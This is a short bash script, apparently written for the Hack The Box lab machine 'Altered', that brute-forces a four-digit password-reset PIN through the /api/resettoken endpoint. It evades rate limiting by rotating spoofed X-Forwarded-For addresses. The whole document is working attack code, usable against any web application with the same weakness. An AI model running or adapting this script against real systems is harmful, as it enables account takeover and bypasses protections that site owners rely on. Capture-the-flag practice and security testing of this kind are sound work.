#!/bin/bash
# brute_pin.sh
# Brute-forces the 4-digit reset PIN on HTB: Altered
# Bypasses rate limiting via X-Forwarded-For header rotation
#
# Usage: ./brute_pin.sh <target_ip> <username>
# Example: ./brute_pin.sh 10.129.227.109 admin

TARGET="http://${1:-10.129.227.109}"
USER="${2:-admin}"
OCTET=0
FOUND=0

echo "[*] Target: $TARGET"
echo "[*] Username: $USER"
echo "[*] Starting PIN brute-force (0000–9999)..."

for pin in $(seq -w 0 9999); do
    OCTET=$(( (OCTET + 1) % 254 + 1 ))
    XFF="10.0.${OCTET}.$(( RANDOM % 254 + 1 ))"

    RESP=$(curl -s -X POST "${TARGET}/api/resettoken" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: ${XFF}" \
        -d "{\"name\":\"${USER}\",\"token\":\"${pin}\"}")

    if ! echo "$RESP" | grep -qi "invalid"; then
        echo ""
        echo "[+] PIN found: $pin"
        echo "[+] XFF used: $XFF"
        echo "[+] Response: $RESP"
        FOUND=1
        break
    fi

    # Progress every 500 attempts
    if (( 10#$pin % 500 == 0 )); then
        echo "    [...] Tried up to $pin"
    fi
done

if [[ $FOUND -eq 0 ]]; then
    echo "[-] PIN not found in range 0000–9999"
fi
